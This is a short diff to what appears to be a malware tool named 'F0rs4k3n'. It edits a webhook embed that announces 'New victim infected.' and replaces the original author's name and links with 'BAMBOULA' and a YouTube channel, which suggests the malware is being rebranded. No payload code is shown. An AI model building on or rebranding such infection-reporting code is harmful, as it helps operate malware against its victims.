@@ -52,7 +52,7 @@ embeds = [
     {
       "title": "F0rs4k3n",
       "description": "New victim infected.",
-      "url": "https://github.com/billythegoat356/F0rs4k3n",
+      "url": "https://www.youtube.com/channel/UCaXzSsBYiQ3SrjQd7xEv2LQ",
       "color": 0x0000ff,
       "fields": [
         {
@@ -71,12 +71,12 @@ embeds = [
         }
       ],
       "author": {
-        "name": "billythegoat356",
-        "url": "https://github.com/billythegoat356",
+        "name": "BAMBOULA",
+        "url": "https://www.youtube.com/channel/UCaXzSsBYiQ3SrjQd7xEv2LQ",
         "icon_url": "https://camo.githubusercontent.com/17a1ebec14bc2b0263d46efcdecacf1d535ffeb770834e7911b1e147e9b46e4c/68747470733a2f2f7a7570696d616765732e6e65742f75702f32312f32322f6f6536782e676966"
       },
       "footer": {
-        "text": "by billythegoat356",
+        "text": "by BAMBOULA",
         "icon_url": "https://avatars.githubusercontent.com/u/77754159?v=4"
       },
       "timestamp": "2001-09-10T22:00:00.000Z",
